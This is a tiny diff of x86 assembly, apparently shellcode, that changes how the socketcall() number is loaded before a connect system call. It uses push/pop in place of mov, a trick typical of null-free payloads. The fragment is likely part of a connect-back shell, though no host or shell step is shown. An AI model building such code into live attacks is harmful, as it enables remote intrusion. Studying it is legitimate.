@@ -35,7 +35,8 @@ _start:
   ;; function
   mov ecx, esp      ; pointer to args on the stack into ecx
   push ebx          ; #define SYS_CONNECT 3
-  mov al, 0x66      ; socketcall()
+  push 0x66         ; socketcall()
+  pop eax
   ;; call
   int 0x80
   ;; returned data
